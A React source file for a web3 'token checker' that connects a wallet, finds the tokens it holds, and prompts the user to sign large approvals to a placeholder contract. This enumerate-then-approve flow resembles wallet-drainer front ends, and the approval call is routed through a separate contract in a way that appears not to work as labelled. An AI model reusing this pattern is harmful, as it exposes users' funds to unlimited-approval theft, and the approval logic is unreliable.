import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { TokenList } from './components/TokenList';
import { NETWORK_TOKENS } from './utils/tokenList';
import { getChainId, checkTokenBalance } from './utils/web3';

const TOKEN_CHECKER_ABI = [
  "function getTokenInfo(address wallet, address[] calldata tokens) external view returns (tuple(address tokenAddress, uint256 balance, uint256 allowance)[])",
  "function approveTokens(address[] calldata tokens, uint256[] calldata amounts) external",
  "function revokeApproval(address token) external"
];

const CONTRACT_ADDRESS = 'YOUR_CONTRACT_ADDRESS';

function App() {
  const [account, setAccount] = useState('');
  const [tokenInfo, setTokenInfo] = useState([]);
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', handleAccountsChanged);
      window.ethereum.on('chainChanged', () => window.location.reload());
    }
    return () => {
      if (window.ethereum) {
        window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
      }
    };
  }, []);

  useEffect(() => {
    if (account) {
      detectTokens();
    }
  }, [account]);

  const handleAccountsChanged = (accounts) => {
    if (accounts.length > 0) {
      setAccount(accounts[0]);
    } else {
      setAccount('');
      setTokenInfo([]);
    }
  };

  const connectWallet = async () => {
    if (window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        setAccount(accounts[0]);
      } catch (error) {
        console.error('Error connecting wallet:', error);
      }
    }
  };

  const detectTokens = async () => {
    if (!account) return;
    
    setIsLoading(true);
    try {
      const chainId = await getChainId();
      const networkTokens = NETWORK_TOKENS[chainId] || [];
      
      const provider = new ethers.BrowserProvider(window.ethereum);
      
      // Filter tokens that the wallet has a balance for
      const tokensWithBalance = [];
      for (const tokenAddress of networkTokens) {
        const hasBalance = await checkTokenBalance(tokenAddress, account, provider);
        if (hasBalance) {
          tokensWithBalance.push(tokenAddress);
        }
      }
      
      if (tokensWithBalance.length > 0) {
        const contract = new ethers.Contract(
          CONTRACT_ADDRESS,
          TOKEN_CHECKER_ABI,
          provider
        );

        const info = await contract.getTokenInfo(account, tokensWithBalance);
        setTokenInfo(info);
      }
    } catch (error) {
      console.error('Error detecting tokens:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const approveToken = async (tokenAddress) => {
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const contract = new ethers.Contract(
        CONTRACT_ADDRESS,
        TOKEN_CHECKER_ABI,
        signer
      );

      const maxApproval = ethers.parseUnits('1000000', 18);
      await contract.approveTokens([tokenAddress], [maxApproval]);
      
      // Refresh token info after approval
      await detectTokens();
    } catch (error) {
      console.error('Error approving token:', error);
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 p-8">
      <div className="max-w-4xl mx-auto">
        <h1 className="text-3xl font-bold mb-8">Automatic Token Checker & Approval</h1>
        
        {!account ? (
          <button
            onClick={connectWallet}
            className="bg-blue-500 text-white px-4 py-2 rounded"
          >
            Connect Wallet
          </button>
        ) : (
          <div>
            <p className="mb-4">Connected: {account}</p>
            
            {isLoading ? (
              <p className="text-gray-600">Detecting tokens...</p>
            ) : tokenInfo.length > 0 ? (
              <TokenList tokenInfo={tokenInfo} onApprove={approveToken} />
            ) : (
              <p className="text-gray-600">No tokens found in this wallet</p>
            )}
            
            <button
              onClick={detectTokens}
              className="bg-purple-500 text-white px-4 py-2 rounded mt-4"
            >
              Refresh Tokens
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

export default App;